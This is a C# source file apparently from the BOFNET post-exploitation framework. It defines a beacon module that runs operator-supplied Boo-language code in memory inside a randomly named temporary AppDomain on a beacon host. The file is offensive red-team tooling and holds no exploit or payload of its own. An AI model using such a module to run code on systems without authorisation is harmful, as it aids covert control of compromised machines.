using BOFNET;
using BOFNET.Bofs.Boo;
using System;
using System.Linq;
using System.Reflection;
using System.Text;

namespace BOFNET.Bofs.Boo {
    public class BooRunner : BeaconObject {

        public BooRunner(BeaconApi api) : base(api) {
        }

        private static Random random = new Random();
        public static string RandomString(int length) {
            const string chars = "abcdefghijklmnopqrstuvwxysABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public override void Go(byte[] booCode) {

#if (NET461)

            if(booCode == null || booCode.Length == 0) {
                BeaconConsole.WriteLine("[!] No source code given to run, provide your BooLang code as the first and only argument");
                return;
            }

            string booCodeStr = Encoding.UTF8.GetString(booCode);
            string temporaryAppDomainName = RandomString(10);
            AppDomain temporaryAppDomain = null;
            Runtime.AssemblyInfo runtimeAssembly = Runtime.LoadedAssemblies["BOFNET"];
  
            try {

                temporaryAppDomain = (AppDomain)InitialiseChildBOFNETAppDomain(temporaryAppDomainName, runtimeAssembly.AssemblyData, runtimeAssembly.AssemblyData.Length);

                if (temporaryAppDomain == null) {
                    BeaconConsole.WriteLine("[!] Failed to setup temporary AppDomain for Boo exection");
                    return;
                }
      
                BooExecutor booExecutor = temporaryAppDomain.CreateInstanceAndUnwrap(Assembly.GetExecutingAssembly().FullName,
                                                                                      "BOFNET.Bofs.Boo.BooExecutorImpl") as BooExecutor;

                booExecutor.Init(BeaconConsole);
                booExecutor.Execute(booCodeStr);

            } finally {
                if(temporaryAppDomain != null)
                    AppDomain.Unload(temporaryAppDomain);
            }
#else
            BeaconConsole.WriteLine("[!] Boo execution not supported under .NET 2.0");

#endif
        }
    }
}
